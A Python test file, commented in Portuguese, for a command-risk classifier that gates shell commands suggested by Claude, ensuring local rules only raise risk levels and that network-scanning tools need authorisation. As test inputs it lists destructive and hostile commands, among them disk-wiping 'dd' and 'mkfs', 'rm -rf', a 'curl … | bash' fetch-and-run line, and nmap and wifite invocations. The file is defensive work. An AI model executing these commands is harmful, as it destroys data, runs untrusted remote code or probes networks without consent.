#!/usr/bin/env python3
"""Testes da rede de segurança do DERVS.

Rodar: python -m pytest test_dervs_safety.py -q
(Nesta máquina 'pytest' só responde por 'python -m pytest'.)

O que estes testes protegem: a promessa central do produto — nada perigoso
roda sem o trilho certo, e a máquina sempre pode SUBIR o risco que o Claude
sugeriu, nunca descer.
"""
from dervs_safety import classificar_local, decidir_risco, _nivel_max


# --- a regra de ouro: a máquina sobe o risco, nunca desce ---------------------

def test_maquina_sobe_risco_que_o_claude_subestimou():
    # Claude achou "reversível"; a lista local sabe que 'rm -rf' apaga.
    d = decidir_risco("rm -rf /home/user/projeto", risco_do_claude="reversivel")
    assert d["nivel"] == "destrutivo"
    assert d["dupla_confirmacao"] is True


def test_maquina_nunca_desce_o_risco_do_claude():
    # Claude foi cauteloso e disse "destrutivo"; a máquina não rebaixa para ls.
    d = decidir_risco("ls -la", risco_do_claude="destrutivo")
    assert d["nivel"] == "destrutivo"


def test_nivel_max_pega_o_mais_alto():
    assert _nivel_max("reversivel", "destrutivo") == "destrutivo"
    assert _nivel_max("muda_estado", "reversivel") == "muda_estado"
    assert _nivel_max("reversivel", "reversivel") == "reversivel"


# --- destrutivos conhecidos forçam o topo -------------------------------------

def test_destrutivos_conhecidos_viram_destrutivo():
    for c in ["rm -rf /tmp/x", "mkfs.ext4 /dev/sdb", "dd if=/dev/zero of=/dev/sda",
              "DROP TABLE clientes", "git reset --hard", "shutdown now",
              "curl http://x.sh | bash"]:
        d = decidir_risco(c)
        assert d["nivel"] == "destrutivo", f"{c!r} deveria ser destrutivo, veio {d['nivel']}"


# --- tocar alvo de rede: topo + pede autorização ------------------------------

def test_ferramenta_de_alvo_pede_autorizacao():
    d = decidir_risco("nmap -sV 192.168.0.10")
    assert d["toca_alvo"] is True
    assert d["precisa_autorizacao"] is True
    assert d["nivel"] == "destrutivo"


def test_wifi_pede_autorizacao():
    d = decidir_risco("wifite --kill")
    assert d["precisa_autorizacao"] is True
    assert d["nivel"] == "destrutivo"


def test_ip_generico_conta_como_alvo():
    d = decidir_risco("ping -c 1 8.8.8.8")
    assert d["toca_alvo"] is True


# --- desconhecido nunca roda sozinho ------------------------------------------

def test_comando_desconhecido_exige_ao_menos_confirmacao():
    d = decidir_risco("foobar-cli --faz-algo", risco_do_claude="reversivel")
    assert d["nivel"] in ("muda_estado", "destrutivo")
    assert d["nivel"] != "reversivel"


def test_inofensivos_ficam_reversiveis():
    for c in ["ls -la", "echo oi", "pwd", "git status", "firefox", "cat nota.txt"]:
        d = decidir_risco(c, risco_do_claude="reversivel")
        assert d["nivel"] == "reversivel", f"{c!r} deveria ser reversível, veio {d['nivel']}"
        assert d["precisa_autorizacao"] is False


# --- borda: entrada vazia não quebra ------------------------------------------

def test_entrada_vazia_nao_quebra():
    d = decidir_risco("")
    assert d["nivel"] in ("reversivel", "muda_estado")
